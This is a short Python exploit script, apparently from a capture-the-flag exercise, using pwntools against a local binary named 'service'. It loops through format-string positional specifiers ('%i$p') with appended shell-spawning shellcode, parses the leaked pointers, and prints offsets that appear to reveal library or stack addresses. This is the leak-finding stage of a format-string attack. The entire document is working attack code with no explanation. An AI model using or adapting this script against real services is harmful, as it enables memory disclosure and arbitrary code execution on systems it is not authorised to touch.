#!/usr/bin/env python3

from pwn import *

context.log_level = 'ERROR'

exe = ELF("./service", checksec=True)

context.binary = exe
context.terminal = ['konsole', '-e']

for i in range(1, 1000):
    r = process([exe.path])
    r.recvuntil(': ')
    r.sendline(b'%' + str(i).encode() + b'$p-' + asm(shellcraft.sh()))
    greeting = r.recvuntil(': ')
    try:
        leaked_addr = int(greeting.split(b'-')[0].split(b' ')[-1].decode(), 16)
    except:
        leaked_addr = -1
    if hex(leaked_addr).startswith('0xf7'):
        print(b'%' + str(i).encode() + b'$p', hex(leaked_addr))
    r.close()

